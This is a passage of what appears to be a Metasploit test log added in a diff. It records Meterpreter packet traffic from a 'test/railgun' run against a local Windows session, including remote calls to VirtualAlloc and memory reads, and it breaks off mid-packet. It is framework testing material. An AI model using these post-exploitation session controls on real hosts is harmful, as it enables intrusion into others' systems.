+  #<Rex::Post::Meterpreter::GroupTlv type=unknown-1073743247 tlvs=[
+  #<Rex::Post::Meterpreter::Tlv type=unknown-263564  meta=RAW        value="\xE0\x00\x00\x00">
+  #<Rex::Post::Meterpreter::Tlv type=unknown-263565  meta=RAW        value="\xF0\x00\x00\x00">
+  #<Rex::Post::Meterpreter::Tlv type=unknown-263566  meta=RAW        value="\x00\x00\x00\x00">
+  #<Rex::Post::Meterpreter::Tlv type=STRING          meta=STRING     value="Hyper-V Virtual Ethernet Adapter">
+  #<Rex::Post::Meterpreter::Tlv type=unknown-132515  meta=INT        value=5256>
+]>
+  #<Rex::Post::Meterpreter::GroupTlv type=unknown-1073743247 tlvs=[
+  #<Rex::Post::Meterpreter::Tlv type=unknown-263564  meta=RAW        value="\xFF\xFF\xFF\xFF">
+  #<Rex::Post::Meterpreter::Tlv type=unknown-263565  meta=RAW        value="\xFF\xFF\xFF\xFF">
+  #<Rex::Post::Meterpreter::Tlv type=unknown-263566  meta=RAW        value="\x00\x00\x00\x00">
+  #<Rex::Post::Meterpreter::Tlv type=STRING          meta=STRING     value="Software Loopback Interface 1">
+  #<Rex::Post::Meterpreter::Tlv type=unknown-132515  meta=INT        value=331>
+]>
+  #<Rex::Post::Meterpreter::GroupTlv type=unknown-1073743247 tlvs=[
+  #<Rex::Post::Meterpreter::Tlv type=unknown-263564  meta=RAW        value="\xFF\xFF\xFF\xFF">
+  #<Rex::Post::Meterpreter::Tlv type=unknown-263565  meta=RAW        value="\xFF\xFF\xFF\xFF">
+  #<Rex::Post::Meterpreter::Tlv type=unknown-263566  meta=RAW        value="\x00\x00\x00\x00">
+  #<Rex::Post::Meterpreter::Tlv type=STRING          meta=STRING     value="Microsoft Hyper-V Network Adapter">
+  #<Rex::Post::Meterpreter::Tlv type=unknown-132515  meta=INT        value=266>
+]>
+  #<Rex::Post::Meterpreter::GroupTlv type=unknown-1073743247 tlvs=[
+  #<Rex::Post::Meterpreter::Tlv type=unknown-263564  meta=RAW        value="\xFF\xFF\xFF\xFF">
+  #<Rex::Post::Meterpreter::Tlv type=unknown-263565  meta=RAW        value="\xFF\xFF\xFF\xFF">
+  #<Rex::Post::Meterpreter::Tlv type=unknown-263566  meta=RAW        value="\x00\x00\x00\x00">
+  #<Rex::Post::Meterpreter::Tlv type=STRING          meta=STRING     value="Hyper-V Virtual Ethernet Adapter">
+  #<Rex::Post::Meterpreter::Tlv type=unknown-132515  meta=INT        value=5256>
+]>
+  #<Rex::Post::Meterpreter::GroupTlv type=unknown-1073743247 tlvs=[
+  #<Rex::Post::Meterpreter::Tlv type=unknown-263564  meta=RAW        value="\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\ ...">
+  #<Rex::Post::Meterpreter::Tlv type=unknown-263565  meta=RAW        value="\xFF\xFF\xFF\xFF\xFF\xFF\xFF\xFF\xFF\xFF\xFF\xFF\ ...">
+  #<Rex::Post::Meterpreter::Tlv type=unknown-263566  meta=RAW        value="\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\ ...">
+  #<Rex::Post::Meterpreter::Tlv type=STRING          meta=STRING     value="Software Loopback Interface 1">
+  #<Rex::Post::Meterpreter::Tlv type=unknown-132515  meta=INT        value=331>
+]>
+  #<Rex::Post::Meterpreter::GroupTlv type=unknown-1073743247 tlvs=[
+  #<Rex::Post::Meterpreter::Tlv type=unknown-263564  meta=RAW        value="\xFE\x80\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\ ...">
+  #<Rex::Post::Meterpreter::Tlv type=unknown-263565  meta=RAW        value="\xFF\xFF\xFF\xFF\xFF\xFF\xFF\xFF\x00\x00\x00\x00\ ...">
+  #<Rex::Post::Meterpreter::Tlv type=unknown-263566  meta=RAW        value="\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\ ...">
+  #<Rex::Post::Meterpreter::Tlv type=STRING          meta=STRING     value="Microsoft Hyper-V Network Adapter">
+  #<Rex::Post::Meterpreter::Tlv type=unknown-132515  meta=INT        value=266>
+]>
+  #<Rex::Post::Meterpreter::GroupTlv type=unknown-1073743247 tlvs=[
+  #<Rex::Post::Meterpreter::Tlv type=unknown-263564  meta=RAW        value="\xFE\x80\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\ ...">
+  #<Rex::Post::Meterpreter::Tlv type=unknown-263565  meta=RAW        value="\xFF\xFF\xFF\xFF\xFF\xFF\xFF\xFF\x00\x00\x00\x00\ ...">
+  #<Rex::Post::Meterpreter::Tlv type=unknown-263566  meta=RAW        value="\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\ ...">
+  #<Rex::Post::Meterpreter::Tlv type=STRING          meta=STRING     value="Hyper-V Virtual Ethernet Adapter">
+  #<Rex::Post::Meterpreter::Tlv type=unknown-132515  meta=INT        value=5256>
+]>
+  #<Rex::Post::Meterpreter::GroupTlv type=unknown-1073743247 tlvs=[
+  #<Rex::Post::Meterpreter::Tlv type=unknown-263564  meta=RAW        value="\xFE\x80\x00\x00\x00\x00\x00\x00\x9C\xBAf\xF6\xBE ...">
+  #<Rex::Post::Meterpreter::Tlv type=unknown-263565  meta=RAW        value="\xFF\xFF\xFF\xFF\xFF\xFF\xFF\xFF\xFF\xFF\xFF\xFF\ ...">
+  #<Rex::Post::Meterpreter::Tlv type=unknown-263566  meta=RAW        value="\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\ ...">
+  #<Rex::Post::Meterpreter::Tlv type=STRING          meta=STRING     value="Microsoft Hyper-V Network Adapter">
+  #<Rex::Post::Meterpreter::Tlv type=unknown-132515  meta=INT        value=266>
+]>
+  #<Rex::Post::Meterpreter::GroupTlv type=unknown-1073743247 tlvs=[
+  #<Rex::Post::Meterpreter::Tlv type=unknown-263564  meta=RAW        value="\xFE\x80\x00\x00\x00\x00\x00\x00\xC4\x8F\xDD\x06\ ...">
+  #<Rex::Post::Meterpreter::Tlv type=unknown-263565  meta=RAW        value="\xFF\xFF\xFF\xFF\xFF\xFF\xFF\xFF\xFF\xFF\xFF\xFF\ ...">
+  #<Rex::Post::Meterpreter::Tlv type=unknown-263566  meta=RAW        value="\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\ ...">
+  #<Rex::Post::Meterpreter::Tlv type=STRING          meta=STRING     value="Hyper-V Virtual Ethernet Adapter">
+  #<Rex::Post::Meterpreter::Tlv type=unknown-132515  meta=INT        value=5256>
+]>
+  #<Rex::Post::Meterpreter::GroupTlv type=unknown-1073743247 tlvs=[
+  #<Rex::Post::Meterpreter::Tlv type=unknown-263564  meta=RAW        value="\xFF\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\ ...">
+  #<Rex::Post::Meterpreter::Tlv type=unknown-263565  meta=RAW        value="\xFF\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\ ...">
+  #<Rex::Post::Meterpreter::Tlv type=unknown-263566  meta=RAW        value="\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\ ...">
+  #<Rex::Post::Meterpreter::Tlv type=STRING          meta=STRING     value="Software Loopback Interface 1">
+  #<Rex::Post::Meterpreter::Tlv type=unknown-132515  meta=INT        value=331>
+]>
+  #<Rex::Post::Meterpreter::GroupTlv type=unknown-1073743247 tlvs=[
+  #<Rex::Post::Meterpreter::Tlv type=unknown-263564  meta=RAW        value="\xFF\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\ ...">
+  #<Rex::Post::Meterpreter::Tlv type=unknown-263565  meta=RAW        value="\xFF\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\ ...">
+  #<Rex::Post::Meterpreter::Tlv type=unknown-263566  meta=RAW        value="\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\ ...">
+  #<Rex::Post::Meterpreter::Tlv type=STRING          meta=STRING     value="Microsoft Hyper-V Network Adapter">
+  #<Rex::Post::Meterpreter::Tlv type=unknown-132515  meta=INT        value=266>
+]>
+  #<Rex::Post::Meterpreter::GroupTlv type=unknown-1073743247 tlvs=[
+  #<Rex::Post::Meterpreter::Tlv type=unknown-263564  meta=RAW        value="\xFF\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\ ...">
+  #<Rex::Post::Meterpreter::Tlv type=unknown-263565  meta=RAW        value="\xFF\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\ ...">
+  #<Rex::Post::Meterpreter::Tlv type=unknown-263566  meta=RAW        value="\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\ ...">
+  #<Rex::Post::Meterpreter::Tlv type=STRING          meta=STRING     value="Hyper-V Virtual Ethernet Adapter">
+  #<Rex::Post::Meterpreter::Tlv type=unknown-132515  meta=INT        value=5256>
+]>
+  #<Rex::Post::Meterpreter::Tlv type=REQUEST-ID      meta=STRING     value="06187609527362563616066423031293">
+  #<Rex::Post::Meterpreter::Tlv type=RESULT          meta=INT        value=0>
+]>
+[*] Meterpreter session 7 opened (127.0.0.1:6007 -> 127.0.0.1:50100 ) at 2022-02-06 23:28:14 +0000
+use test/railgun
+msf6 post(test/railgun) > run session=7 AddEntropy=true Verbose=true
+[!] SESSION may not be compatible with this module:
+[!]  * incompatible session type: meterpreter
+[!]  * missing Meterpreter features: stdapi_fs_chmod
+[*] Running against session 7
+[*] Session type is meterpreter and platform is windows
+
+[1;31mSEND[0m: #<Rex::Post::Meterpreter::Packet type=Request         tlvs=[
+  #<Rex::Post::Meterpreter::Tlv type=COMMAND-ID      meta=INT        value=1006 command=stdapi_fs_file_expand_path>
+  #<Rex::Post::Meterpreter::Tlv type=REQUEST-ID      meta=STRING     value="27063542247843231110027964298331">
+  #<Rex::Post::Meterpreter::Tlv type=unknown-66738   meta=STRING     value="%WINDIR%\\system32\\win32k.sys">
+]>
+
+[1;32mRECV[0m: #<Rex::Post::Meterpreter::Packet type=Response        tlvs=[
+  #<Rex::Post::Meterpreter::Tlv type=COMMAND-ID      meta=INT        value=1006 command=stdapi_fs_file_expand_path>
+  #<Rex::Post::Meterpreter::Tlv type=UUID            meta=RAW        value=";:\v\xE1\x98\x13\x04\x97\xD8\xE5\xCD\xF1\xBA\xE5\ ...">
+  #<Rex::Post::Meterpreter::Tlv type=unknown-66738   meta=STRING     value="C:\\Windows\\system32\\win32k.sys">
+  #<Rex::Post::Meterpreter::Tlv type=REQUEST-ID      meta=STRING     value="27063542247843231110027964298331">
+  #<Rex::Post::Meterpreter::Tlv type=RESULT          meta=INT        value=0>
+]>
+
+[1;31mSEND[0m: #<Rex::Post::Meterpreter::Packet type=Request         tlvs=[
+  #<Rex::Post::Meterpreter::Tlv type=COMMAND-ID      meta=INT        value=15 command=core_native_arch>
+  #<Rex::Post::Meterpreter::Tlv type=REQUEST-ID      meta=STRING     value="85071149066542272639813554718683">
+]>
+
+[1;32mRECV[0m: #<Rex::Post::Meterpreter::Packet type=Response        tlvs=[
+  #<Rex::Post::Meterpreter::Tlv type=COMMAND-ID      meta=INT        value=15 command=core_native_arch>
+  #<Rex::Post::Meterpreter::Tlv type=UUID            meta=RAW        value=";:\v\xE1\x98\x13\x04\x97\xD8\xE5\xCD\xF1\xBA\xE5\ ...">
+  #<Rex::Post::Meterpreter::Tlv type=STRING          meta=STRING     value="x64">
+  #<Rex::Post::Meterpreter::Tlv type=REQUEST-ID      meta=STRING     value="85071149066542272639813554718683">
+  #<Rex::Post::Meterpreter::Tlv type=RESULT          meta=INT        value=0>
+]>
+
+[1;31mSEND[0m: #<Rex::Post::Meterpreter::Packet type=Request         tlvs=[
+  #<Rex::Post::Meterpreter::Tlv type=COMMAND-ID      meta=INT        value=1028 command=stdapi_railgun_api>
+  #<Rex::Post::Meterpreter::Tlv type=REQUEST-ID      meta=STRING     value="69960426225577867285285811472242">
+  #<Rex::Post::Meterpreter::Tlv type=unknown-151073  meta=INT        value=0>
+  #<Rex::Post::Meterpreter::Tlv type=unknown-282146  meta=RAW        value="\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\ ...">
+  #<Rex::Post::Meterpreter::Tlv type=unknown-282147  meta=RAW        value="C:\\Windows\\system32\\win32k.sys\x00\x00">
+  #<Rex::Post::Meterpreter::Tlv type=unknown-282148  meta=RAW        value="">
+  #<Rex::Post::Meterpreter::Tlv type=unknown-85545   meta=STRING     value="version">
+  #<Rex::Post::Meterpreter::Tlv type=unknown-85546   meta=STRING     value="GetFileVersionInfoSizeA">
+  #<Rex::Post::Meterpreter::Tlv type=unknown-85551   meta=STRING     value="stdcall">
+]>
+
+[1;32mRECV[0m: #<Rex::Post::Meterpreter::Packet type=Response        tlvs=[
+  #<Rex::Post::Meterpreter::Tlv type=COMMAND-ID      meta=INT        value=1028 command=stdapi_railgun_api>
+  #<Rex::Post::Meterpreter::Tlv type=UUID            meta=RAW        value=";:\v\xE1\x98\x13\x04\x97\xD8\xE5\xCD\xF1\xBA\xE5\ ...">
+  #<Rex::Post::Meterpreter::Tlv type=unknown-151080  meta=INT        value=0>
+  #<Rex::Post::Meterpreter::Tlv type=unknown-85552   meta=STRING     value="The operation completed successfully.">
+  #<Rex::Post::Meterpreter::Tlv type=unknown-1068583 meta=QWORD      value=1892>
+  #<Rex::Post::Meterpreter::Tlv type=unknown-282149  meta=RAW        value="">
+  #<Rex::Post::Meterpreter::Tlv type=unknown-282150  meta=RAW        value="">
+  #<Rex::Post::Meterpreter::Tlv type=REQUEST-ID      meta=STRING     value="69960426225577867285285811472242">
+  #<Rex::Post::Meterpreter::Tlv type=RESULT          meta=INT        value=0>
+]>
+
+[1;31mSEND[0m: #<Rex::Post::Meterpreter::Packet type=Request         tlvs=[
+  #<Rex::Post::Meterpreter::Tlv type=COMMAND-ID      meta=INT        value=1028 command=stdapi_railgun_api>
+  #<Rex::Post::Meterpreter::Tlv type=REQUEST-ID      meta=STRING     value="88445714843624497419331769042107">
+  #<Rex::Post::Meterpreter::Tlv type=unknown-151073  meta=INT        value=0>
+  #<Rex::Post::Meterpreter::Tlv type=unknown-282146  meta=RAW        value="\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\ ...">
+  #<Rex::Post::Meterpreter::Tlv type=unknown-282147  meta=RAW        value="">
+  #<Rex::Post::Meterpreter::Tlv type=unknown-282148  meta=RAW        value="">
+  #<Rex::Post::Meterpreter::Tlv type=unknown-85545   meta=STRING     value="kernel32">
+  #<Rex::Post::Meterpreter::Tlv type=unknown-85546   meta=STRING     value="VirtualAlloc">
+  #<Rex::Post::Meterpreter::Tlv type=unknown-85551   meta=STRING     value="stdcall">
+]>
+
+[1;32mRECV[0m: #<Rex::Post::Meterpreter::Packet type=Response        tlvs=[
+  #<Rex::Post::Meterpreter::Tlv type=COMMAND-ID      meta=INT        value=1028 command=stdapi_railgun_api>
+  #<Rex::Post::Meterpreter::Tlv type=UUID            meta=RAW        value=";:\v\xE1\x98\x13\x04\x97\xD8\xE5\xCD\xF1\xBA\xE5\ ...">
+  #<Rex::Post::Meterpreter::Tlv type=unknown-151080  meta=INT        value=0>
+  #<Rex::Post::Meterpreter::Tlv type=unknown-85552   meta=STRING     value="The operation completed successfully.">
+  #<Rex::Post::Meterpreter::Tlv type=unknown-1068583 meta=QWORD      value=1484053872640>
+  #<Rex::Post::Meterpreter::Tlv type=unknown-282149  meta=RAW        value="">
+  #<Rex::Post::Meterpreter::Tlv type=unknown-282150  meta=RAW        value="">
+  #<Rex::Post::Meterpreter::Tlv type=REQUEST-ID      meta=STRING     value="88445714843624497419331769042107">
+  #<Rex::Post::Meterpreter::Tlv type=RESULT          meta=INT        value=0>
+]>
+
+[1;31mSEND[0m: #<Rex::Post::Meterpreter::Packet type=Request         tlvs=[
+  #<Rex::Post::Meterpreter::Tlv type=COMMAND-ID      meta=INT        value=1028 command=stdapi_railgun_api>
+  #<Rex::Post::Meterpreter::Tlv type=REQUEST-ID      meta=STRING     value="87595778332236371219594239678589">
+  #<Rex::Post::Meterpreter::Tlv type=unknown-151073  meta=INT        value=0>
+  #<Rex::Post::Meterpreter::Tlv type=unknown-282146  meta=RAW        value="\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\ ...">
+  #<Rex::Post::Meterpreter::Tlv type=unknown-282147  meta=RAW        value="C:\\Windows\\system32\\win32k.sys\x00\x00">
+  #<Rex::Post::Meterpreter::Tlv type=unknown-282148  meta=RAW        value="">
+  #<Rex::Post::Meterpreter::Tlv type=unknown-85545   meta=STRING     value="version">
+  #<Rex::Post::Meterpreter::Tlv type=unknown-85546   meta=STRING     value="GetFileVersionInfoA">
+  #<Rex::Post::Meterpreter::Tlv type=unknown-85551   meta=STRING     value="stdcall">
+]>
+
+[1;32mRECV[0m: #<Rex::Post::Meterpreter::Packet type=Response        tlvs=[
+  #<Rex::Post::Meterpreter::Tlv type=COMMAND-ID      meta=INT        value=1028 command=stdapi_railgun_api>
+  #<Rex::Post::Meterpreter::Tlv type=UUID            meta=RAW        value=";:\v\xE1\x98\x13\x04\x97\xD8\xE5\xCD\xF1\xBA\xE5\ ...">
+  #<Rex::Post::Meterpreter::Tlv type=unknown-151080  meta=INT        value=0>
+  #<Rex::Post::Meterpreter::Tlv type=unknown-85552   meta=STRING     value="The operation completed successfully.">
+  #<Rex::Post::Meterpreter::Tlv type=unknown-1068583 meta=QWORD      value=1>
+  #<Rex::Post::Meterpreter::Tlv type=unknown-282149  meta=RAW        value="">
+  #<Rex::Post::Meterpreter::Tlv type=unknown-282150  meta=RAW        value="">
+  #<Rex::Post::Meterpreter::Tlv type=REQUEST-ID      meta=STRING     value="87595778332236371219594239678589">
+  #<Rex::Post::Meterpreter::Tlv type=RESULT          meta=INT        value=0>
+]>
+
+[1;31mSEND[0m: #<Rex::Post::Meterpreter::Packet type=Request         tlvs=[
+  #<Rex::Post::Meterpreter::Tlv type=COMMAND-ID      meta=INT        value=1028 command=stdapi_railgun_api>
+  #<Rex::Post::Meterpreter::Tlv type=REQUEST-ID      meta=STRING     value="13818958765503773798508900623038">
+  #<Rex::Post::Meterpreter::Tlv type=unknown-151073  meta=INT        value=12>
+  #<Rex::Post::Meterpreter::Tlv type=unknown-282146  meta=RAW        value="\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x81\x88Y ...">
+  #<Rex::Post::Meterpreter::Tlv type=unknown-282147  meta=RAW        value="\\\x00\x00\x00\x00\x00\x00\x00">
+  #<Rex::Post::Meterpreter::Tlv type=unknown-282148  meta=RAW        value="">
+  #<Rex::Post::Meterpreter::Tlv type=unknown-85545   meta=STRING     value="version">
+  #<Rex::Post::Meterpreter::Tlv type=unknown-85546   meta=STRING     value="VerQueryValueA">
+  #<Rex::Post::Meterpreter::Tlv type=unknown-85551   meta=STRING     value="stdcall">
+]>
+
+[1;32mRECV[0m: #<Rex::Post::Meterpreter::Packet type=Response        tlvs=[
+  #<Rex::Post::Meterpreter::Tlv type=COMMAND-ID      meta=INT        value=1028 command=stdapi_railgun_api>
+  #<Rex::Post::Meterpreter::Tlv type=UUID            meta=RAW        value=";:\v\xE1\x98\x13\x04\x97\xD8\xE5\xCD\xF1\xBA\xE5\ ...">
+  #<Rex::Post::Meterpreter::Tlv type=unknown-151080  meta=INT        value=0>
+  #<Rex::Post::Meterpreter::Tlv type=unknown-85552   meta=STRING     value="The operation completed successfully.">
+  #<Rex::Post::Meterpreter::Tlv type=unknown-1068583 meta=QWORD      value=1>
+  #<Rex::Post::Meterpreter::Tlv type=unknown-282149  meta=RAW        value="(\x00\x81\x88Y\x01\x00\x004\x00\x00\x00">
+  #<Rex::Post::Meterpreter::Tlv type=unknown-282150  meta=RAW        value="">
+  #<Rex::Post::Meterpreter::Tlv type=REQUEST-ID      meta=STRING     value="13818958765503773798508900623038">
+  #<Rex::Post::Meterpreter::Tlv type=RESULT          meta=INT        value=0>
+]>
+
+[1;31mSEND[0m: #<Rex::Post::Meterpreter::Packet type=Request         tlvs=[
+  #<Rex::Post::Meterpreter::Tlv type=COMMAND-ID      meta=INT        value=1030 command=stdapi_railgun_memread>
+  #<Rex::Post::Meterpreter::Tlv type=REQUEST-ID      meta=STRING     value="39293133798708669797141593935873">
+  #<Rex::Post::Meterpreter::Tlv type=unknown-1068588 meta=QWORD      value=1484053872680>
+  #<Rex::Post::Meterpreter::Tlv type=unknown-151086  meta=INT        value=52>
+]>
+
+[1;32mRECV[0m: #<Rex::Post::Meterpreter::Packet type=Response        tlvs=[
+  #<Rex::Post::Meterpreter::Tlv type=COMMAND-ID      meta=INT        value=1030 command=stdapi_railgun_memread>
+  #<Rex::Post::Meterpreter::Tlv type=UUID            meta=RAW        value=";:\v\xE1\x98\x13\x04\x97\xD8\xE5\xCD\xF1\xBA\xE5\ ...">
+  #<Rex::Post::Meterpreter::Tlv type=unknown-282157  meta=RAW        value="\xBD\x04\xEF\xFE\x00\x00\x01\x00\x00\x00\n\x00-\x ...">
+  #<Rex::Post::Meterpreter::Tlv type=REQUEST-ID      meta=STRING     value="39293133798708669797141593935873">
+  #<Rex::Post::Meterpreter::Tlv type=RESULT          meta=INT        value=0>
+]>
+before running test: Should retrieve the win32k file version
+[+] Should retrieve the win32k file version
+
+[1;31mSEND[0m: #<Rex::Post::Meterpreter::Packet type=Request         tlvs=[
+  #<Rex::Post::Meterpreter::Tlv type=COMMAND-ID      meta=INT        value=1028 command=stdapi_railgun_api>
+  #<Rex::Post::Meterpreter::Tlv type=REQUEST-ID      meta=STRING     value="87250818833926596474743250945578">
+  #<Rex::Post::Meterpreter::Tlv type=unknown-151073  meta=INT        value=0>
+  #<Rex::Post::Meterpreter::Tlv type=unknown-282146  meta=RAW        value="">
+  #<Rex::Post::Meterpreter::Tlv type=unknown-282147  meta=RAW        value="">
+  #<Rex::Post::Meterpreter::Tlv type=unknown-282148  meta=RAW        value="">
+  #<Rex::Post::Meterpreter::Tlv type=unknown-85545   meta=STRING     value="kernel32">
+  #<Rex::Post::Meterpreter::Tlv type=unknown-85546   meta=STRING     value="GetCurrentProcess">
+  #<Rex::Post::Meterpreter::Tlv type=unknown-85551   meta=STRING     value="stdcall">
+]>
+
+[1;32mRECV[0m: #<Rex::Post::Meterpreter::Packet type=Response        tlvs=[
+  #<Rex::Post::Meterpreter::Tlv type=COMMAND-ID      meta=INT        value=1028 command=stdapi_railgun_api>
+  #<Rex::Post::Meterpreter::Tlv type=UUID            meta=RAW        value=";:\v\xE1\x98\x13\x04\x97\xD8\xE5\xCD\xF1\xBA\xE5\ ...">
+  #<Rex::Post::Meterpreter::Tlv type=unknown-151080  meta=INT        value=0>
+  #<Rex::Post::Meterpreter::Tlv type=unknown-85552   meta=STRING     value="The operation completed successfully.">
+  #<Rex::Post::Meterpreter::Tlv type=unknown-1068583 meta=QWORD      value=18446744073709551615>
+  #<Rex::Post::Meterpreter::Tlv type=unknown-282149  meta=RAW        value="">
+  #<Rex::Post::Meterpreter::Tlv type=unknown-282150  meta=RAW        value="">
+  #<Rex::Post::Meterpreter::Tlv type=REQUEST-ID      meta=STRING     value="87250818833926596474743250945578">
+  #<Rex::Post::Meterpreter::Tlv type=RESULT          meta=INT        value=0>
+]>
+before running test: Should include error information in the results
+[+] Should include error information in the results
+
+[1;31mSEND[0m: #<Rex::Post::Meterpreter::Packet type=Request         tlvs=[
+  #<Rex::Post::Meterpreter::Tlv type=COMMAND-ID      meta=INT        value=1028 command=stdapi_railgun_api>
+  #<Rex::Post::Meterpreter::Tlv type=REQUEST-ID      meta=STRING     value="30110074251683800275562834466608">
+  #<Rex::Post::Meterpreter::Tlv type=unknown-151073  meta=INT        value=0>
+  #<Rex::Post::Meterpreter::Tlv type=unknown-282146  meta=RAW        value="">
+  #<Rex::Post::Meterpreter::Tlv type=unknown-282147  meta=RAW        value="">
+  #<Rex::Post::Meterpreter::Tlv type=unknown-282148  meta=RAW        value="">
+  #<Rex::Post::Meterpreter::Tlv type=unknown-85545   meta=STRING     value="kernel32">
+  #<Rex::Post::Meterpreter::Tlv type=unknown-85546   meta=STRING     value="GetCurrentThread">
+  #<Rex::Post::Meterpreter::Tlv type=unknown-85551   meta=STRING     value="stdcall">
+]>
+
+[1;32mRECV[0m: #<Rex::Post::Meterpreter::Packet type=Response        tlvs=[
+  #<Rex::Post::Meterpreter::Tlv type=COMMAND-ID      meta=INT        value=1028 command=stdapi_railgun_api>
+  #<Rex::Post::Meterpreter::Tlv type=UUID            meta=RAW        value=";:\v\xE1\x98\x13\x04\x97\xD8\xE5\xCD\xF1\xBA\xE5\ ...">
+  #<Rex::Post::Meterpreter::Tlv type=unknown-151080  meta=INT        value=0>
+  #<Rex::Post::Meterpreter::Tlv type=unknown-85552   meta=STRING     value="The operation completed successfully.">
+  #<Rex::Post::Meterpreter::Tlv type=unknown-1068583 meta=QWORD      value=18446744073709551614>
+  #<Rex::Post::Meterpreter::Tlv type=unknown-282149  meta=RAW        value="">
+  #<Rex::Post::Meterpreter::Tlv type=unknown-282150  meta=RAW        value="">
+  #<Rex::Post::Meterpreter::Tlv type=REQUEST-ID      meta=STRING     value="30110074251683800275562834466608">
+  #<Rex::Post::Meterpreter::Tlv type=RESULT          meta=INT        value=0>
+]>
+before running test: Should support functions with no parameters
+[+] Should support functions with no parameters
+
+[1;31mSEND[0m: #<Rex::Post::Meterpreter::Packet type=Request         tlvs=[
+  #<Rex::Post::Meterpreter::Tlv type=COMMAND-ID      meta=INT        value=1028 command=stdapi_railgun_api>
+  #<Rex::Post::Meterpreter::Tlv type=REQUEST-ID      meta=STRING     value="86084022347508089518964875086701">
+  #<Rex::Post::Meterpreter::Tlv type=unknown-151073  meta=INT        value=0>
+  #<Rex::Post::Meterpreter::Tlv type=unknown-282146  meta=RAW        value="\x00\x00\x00\x00\x00\x00\x00\x002\x00\x00\x00\x00 ...">
+  #<Rex::Post::Meterpreter::Tlv type=unknown-282147  meta=RAW        value="">
+  #<Rex::Post::Meterpreter::Tlv type=unknown-282148  meta=RAW        value="">
+  #<Rex::Post::Meterpreter::Tlv type=unknown-85545   meta=STRING     value="kernel32">
+  #<Rex::Post::Meterpreter::Tlv type=unknown-85546   meta=STRING     value="Sleep">
+  #<Rex::Post::Meterpreter::Tlv type=unknown-85551   meta=STRING     value="stdcall">
+]>
+
+[1;32mRECV[0m: #<Rex::Post::Meterpreter::Packet type=Response        tlvs=[
+  #<Rex::Post::Meterpreter::Tlv type=COMMAND-ID      meta=INT        value=1028 command=stdapi_railgun_api>
+  #<Rex::Post::Meterpreter::Tlv type=UUID            meta=RAW        value=";:\v\xE1\x98\x13\x04\x97\xD8\xE5\xCD\xF1\xBA\xE5\ ...">
+  #<Rex::Post::Meterpreter::Tlv type=unknown-151080  meta=INT        value=0>
+  #<Rex::Post::Meterpreter::Tlv type=unknown-85552   meta=STRING     value="The operation completed successfully.">
+  #<Rex::Post::Meterpreter::Tlv type=unknown-1068583 meta=QWORD      value=0>
+  #<Rex::Post::Meterpreter::Tlv type=unknown-282149  meta=RAW        value="">
+  #<Rex::Post::Meterpreter::Tlv type=unknown-282150  meta=RAW        value="">
+  #<Rex::Post::Meterpreter::Tlv type=REQUEST-ID      meta=STRING     value="86084022347508089518964875086701">
+  #<Rex::Post::Meterpreter::Tlv type=RESULT          meta=INT        value=0>
+]>
+before running test: Should support functions with literal parameters
+[+] Should support functions with literal parameters
+
+[1;31mSEND[0m: #<Rex::Post::Meterpreter::Packet type=Request         tlvs=[
+  #<Rex::Post::Meterpreter::Tlv type=COMMAND-ID      meta=INT        value=1028 command=stdapi_railgun_api>
+  #<Rex::Post::Meterpreter::Tlv type=REQUEST-ID      meta=STRING     value="83381275407438315367739684366396">
+  #<Rex::Post::Meterpreter::Tlv type=unknown-151073  meta=INT        value=64>
+  #<Rex::Post::Meterpreter::Tlv type=unknown-282146  meta=RAW        value="\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\ ...">
+  #<Rex::Post::Meterpreter::Tlv type=unknown-282147  meta=RAW        value="localhost\x00\x00\x00\x00\x00\x00\x00">
+  #<Rex::Post::Meterpreter::Tlv type=unknown-282148  meta=RAW        value="@\x00\x00\x00\x00\x00\x00\x00">
+  #<Rex::Post::Meterpreter::Tlv type=unknown-85545   meta=STRING     value="kernel32">
+  #<Rex::Post::Meterpreter::Tlv type=unknown-85546   meta=STRING     value="DnsHostnameToComputerNameA">
+  #<Rex::Post::Meterpreter::Tlv type=unknown-85551   meta=STRING     value="stdcall">
+]>
+
+[1;32mRECV[0m: #<Rex::Post::Meterpreter::Packet type=Response        tlvs=[
+  #<Rex::Post::Meterpreter::Tlv type=COMMAND-ID      meta=INT        value=1028 command=stdapi_railgun_api>
+  #<Rex::Post::Meterpreter::Tlv type=UUID            meta=RAW        value=";:\v\xE1\x98\x13\x04\x97\xD8\xE5\xCD\xF1\xBA\xE5\ ...">
+  #<Rex::Post::Meterpreter::Tlv type=unknown-151080  meta=INT        value=0>
+  #<Rex::Post::Meterpreter::Tlv type=unknown-85552   meta=STRING     value="The operation completed successfully.">
+  #<Rex::Post::Meterpreter::Tlv type=unknown-1068583 meta=QWORD      value=1>
+  #<Rex::Post::Meterpreter::Tlv type=unknown-282149  meta=RAW        value="LOCALHOST\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00 ...">
+  #<Rex::Post::Meterpreter::Tlv type=unknown-282150  meta=RAW        value="\t\x00\x00\x00\x00\x00\x00\x00">
+  #<Rex::Post::Meterpreter::Tlv type=REQUEST-ID      meta=STRING     value="83381275407438315367739684366396">
+  #<Rex::Post::Meterpreter::Tlv type=RESULT          meta=INT        value=0>
+]>
+before running test: Should support functions with in/out/inout parameter types
+[+] Should support functions with in/out/inout parameter types
+
+[1;31mSEND[0m: #<Rex::Post::Meterpreter::Packet type=Request         tlvs=[
